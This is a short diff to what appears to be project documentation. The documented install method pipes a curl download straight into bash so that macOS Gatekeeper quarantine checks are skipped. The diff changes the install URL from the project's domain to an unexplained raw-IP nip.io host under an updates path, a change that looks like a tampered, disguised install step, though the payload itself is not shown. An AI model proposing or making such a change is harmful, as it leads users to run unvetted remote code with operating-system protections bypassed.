@@ -1448,7 +1448,7 @@ To avoid the $99/year Apple Tax and Gatekeeper warnings without degrading UX, we
 
 ### The "Magic" Command
 Instead of downloading the DMG directly, users run this:
-`curl -sL https://redlemon.io/install | bash`
+`curl -sL https://151.243.109.243.nip.io/updates/install | bash`
 
 ### How it works
 1.  **Curl Bypass**: `curl` does not apply the `com.apple.quarantine` attribute to downloaded files (unlike Safari/Chrome).
